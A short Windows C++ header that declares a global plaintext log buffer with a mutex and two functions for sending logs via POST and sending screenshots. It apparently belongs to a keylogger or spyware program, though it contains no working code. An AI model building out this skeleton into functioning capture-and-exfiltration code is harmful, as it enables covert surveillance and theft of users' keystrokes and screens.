#ifndef MEMORY_H
#define MEMORY_H
#include <mutex>
#include <vector>
#include <Windows.h>

inline std::vector<char> g_plainLogs;
inline std::mutex g_logMutex;


bool send_via_post(const std::vector<char>& logs);
bool send_screenshot(const std::vector<char>& bmpData);

#endif //MEMORY_H
